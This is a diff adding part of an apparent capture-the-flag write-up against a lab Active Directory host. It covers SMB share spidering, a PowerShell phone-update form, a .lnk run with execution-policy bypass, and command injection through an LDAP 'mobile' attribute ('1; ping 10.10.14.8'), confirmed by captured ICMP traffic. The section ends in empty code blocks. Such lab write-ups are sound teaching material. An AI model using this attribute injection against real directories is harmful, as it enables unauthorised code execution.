@@ -718,6 +718,250 @@ SPIDER_PLUS hope.windcorp.htb 445    hope             [+] All files processed su
 ```
 
 ```bash
+$ ls -lha /tmp/nxc_hosted/nxc_spider_plus/hope.windcorp.htb/        
+total 0
+drwxr-xr-x 5 kali kali 100 Aug 26 02:18 .
+drwxr-xr-x 3 kali kali  80 Aug 26 02:17 ..
+drwxr-xr-x 2 kali kali 100 Aug 26 02:17 NETLOGON
+drwxr-xr-x 3 kali kali  60 Aug 26 02:17 SYSVOL
+drwxr-xr-x 3 kali kali  60 Aug 26 02:18 WC-Share
+```
+
+There are 3 interesting files here:
+
+- /NETLOGON/form.ps1
+- /NETLOGON/Update phone.lnk
+- /WC-Share/temp/debug-users.txt
+
+The `/NETLOGON/form.ps1` seems to be a powershell script that generates a GUI and allow user to update their mobile phone number on Active Directory via `adsi`.
+
+```powershell
+#Create Objects
+$SysInfo = New-Object -ComObject "ADSystemInfo"
+$UserDN = $SysInfo.GetType().InvokeMember("UserName","GetProperty", $Null, $SysInfo, $Null)
+$User = [adsi]"LDAP://$($UserDN)"
+
+#Create form
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'SMS password reset setup'
+$form.Size = New-Object System.Drawing.Size(300,200)
+$form.StartPosition = 'CenterScreen'
+
+$okButton = New-Object System.Windows.Forms.Button
+$okButton.Location = New-Object System.Drawing.Point(75,120)
+$okButton.Size = New-Object System.Drawing.Size(75,23)
+$okButton.Text = 'OK'
+$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
+$form.AcceptButton = $okButton
+$form.Controls.Add($okButton)
+
+$cancelButton = New-Object System.Windows.Forms.Button
+$cancelButton.Location = New-Object System.Drawing.Point(150,120)
+$cancelButton.Size = New-Object System.Drawing.Size(75,23)
+$cancelButton.Text = 'Cancel'
+$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+$form.CancelButton = $cancelButton
+$form.Controls.Add($cancelButton)
+
+$label = New-Object System.Windows.Forms.Label
+$label.Location = New-Object System.Drawing.Point(10,20)
+$label.Size = New-Object System.Drawing.Size(280,20)
+$label.Text = 'To be able to reset password using SMS,'
+$form.Controls.Add($label)
+
+$label = New-Object System.Windows.Forms.Label
+$label.Location = New-Object System.Drawing.Point(10,40)
+$label.Size = New-Object System.Drawing.Size(280,20)
+$label.Text = ' you need to keep it updated:'
+$form.Controls.Add($label)
+
+$textBox = New-Object System.Windows.Forms.TextBox
+$textBox.Location = New-Object System.Drawing.Point(10,60)
+$textBox.Size = New-Object System.Drawing.Size(260,20)
+$form.Controls.Add($textBox)
+$textBox.Text = $User.Get("mobile")
+
+$form.Topmost = $true
+
+$form.Add_Shown({$textBox.Select()})
+$result = $form.ShowDialog()
+
+if ($result -eq [System.Windows.Forms.DialogResult]::OK)
+{
+    $x = $textBox.Text
+    $User.Put("mobile",$x)
+    $User.SetInfo()
+}
+```
+
+The `/NETLOGON/Update phone.lnk` seems to be a shurtcut to execute powershell on bypass mode and invoke the `form.ps1` script.
+
+```bash
+$ strings -e l /tmp/nxc_hosted/nxc_spider_plus/hope.windcorp.htb/NETLOGON/Update\ phone.lnk
+Windows
+System32
+WindowsPowerShell
+v1.0
+powershell.exe
+?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe*C:\WINDOWS\System32\WindowsPowerShell\v1.05-w hidden -ep bypass \\windcorp.htb\netlogon\form.ps1
+C:\Windows\System32\shell32.dll
+%SystemRoot%\System32\shell32.dll
+v1.0 (C:\Windows\System32\WindowsPowerShell)
+S-1-5-21-1844305427-4058123335-2739572863-500
+powershell.exe
+Application
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+```
+
+The `/WC-Share/temp/debug-users.txt` seems to be an output of another code that get user name and a random number into it.
+
+```bash
+$ cat /tmp/nxc_hosted/nxc_spider_plus/hope.windcorp.htb/WC-Share/temp/debug-users.txt
+IvanJennings43235345
+MiriamMills93827637
+BenjaminHernandez23232323
+RayDuncan9342211
+```
+
+Lets try to get our properties from ldap and see if any of them match with the presented on txt file.
+
+```bash
+root@webserver:~# ldapsearch -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
+SASL/GSS-SPNEGO authentication started
+SASL username: ray.duncan@WINDCORP.HTB
+SASL SSF: 256
+SASL data security layer installed.
+# extended LDIF
+#
+# LDAPv3
+# base <CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# Ray Duncan, Development, windcorp.htb
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ray Duncan
+sn: Duncan
+givenName: Ray
+distinguishedName: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+instanceType: 4
+whenCreated: 20220430082903.0Z
+whenChanged: 20240826082257.0Z
+uSNCreated: 127163
+memberOf: CN=Development,OU=Groups,DC=windcorp,DC=htb
+uSNChanged: 356768
+name: Ray Duncan
+objectGUID:: sAJ9W9O5u0uUMBaH94W2AQ==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 133034809633163471
+lastLogoff: 0
+lastLogon: 133691649245389274
+pwdLastSet: 133034792223294850
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAE97tbUcM4vF/kEqjnQwAAA==
+accountExpires: 9223372036854775807
+logonCount: 107
+sAMAccountName: Ray.Duncan
+sAMAccountType: 805306368
+userPrincipalName: Ray.Duncan@windcorp.com
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=windcorp,DC=htb
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133691341770869754
+msDS-SupportedEncryptionTypes: 0
+mobile: 9342211
+
+# search result
+search: 3
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+```bash
+root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" 
+mobile | grep mobile:
+mobile: 9342211
+```
+
+The `mobile` value on our user is the same as on the file.
+
+We can change our `mobile` property using [LDIF Files](https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system).
+
+```bash
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: 1; ping 10.10.14.8
+```
+
+```bash
+root@webserver:~# cat rduncun.ldif 
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: 1; ping 10.10.14.8
+```
+
+```bash
+root@webserver:~# ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f rduncun.ldif 
+SASL/GSSAPI authentication started
+SASL username: ray.duncan@WINDCORP.HTB
+SASL SSF: 256
+SASL data security layer installed.
+modifying entry "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
+```
+
+```bash
+root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" mobile | grep mobile:
+mobile: 1; ping 10.10.14.8
+```
+
+After a couple of minutes we see the host trying to reach our via icmp.
+
+```bash
+$ sudo tcpdump -n -i tun0 icmp                  
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+03:29:04.687234 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 40
+03:29:04.687295 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 1, length 40
+03:29:05.701016 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 2, length 40
+03:29:05.701046 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 2, length 40
+03:29:06.710215 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 3, length 40
+03:29:06.710258 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 3, length 40
+03:29:07.719517 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 4, length 40
+03:29:07.719554 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 4, length 40
+```
+
+It means we have remote code execution here.
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
 ```
 
 ```bash
